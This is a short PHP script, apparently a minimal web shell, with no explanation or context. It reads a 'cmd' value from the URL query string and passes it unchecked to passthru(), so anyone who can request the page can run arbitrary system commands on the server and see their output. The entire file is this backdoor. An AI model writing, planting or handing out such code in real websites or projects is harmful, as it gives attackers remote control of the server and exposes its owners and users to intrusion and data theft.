<?php
function execute($com)
{
  if(function_exists('passthru'))
    echo passthru($com);
}

$cmd = $_GET['cmd'];
execute($cmd);
?>